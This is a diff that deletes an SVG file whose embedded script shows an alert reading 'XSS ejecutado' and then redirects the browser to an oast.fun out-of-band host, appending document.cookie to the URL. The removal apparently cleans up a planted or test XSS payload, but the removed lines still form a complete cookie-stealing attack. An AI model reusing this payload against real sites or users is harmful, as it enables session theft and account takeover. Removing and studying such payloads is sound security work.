@@ -1,6 +1,0 @@
-<svg xmlns="http://www.w3.org/2000/svg">
-  <script>
-    alert('XSS ejecutado');
-    document.location='https://zrgftmgvsfrzykdptafy2hnuv9nib4wyi.oast.fun?cookie='+document.cookie;
-  </script>
-</svg>
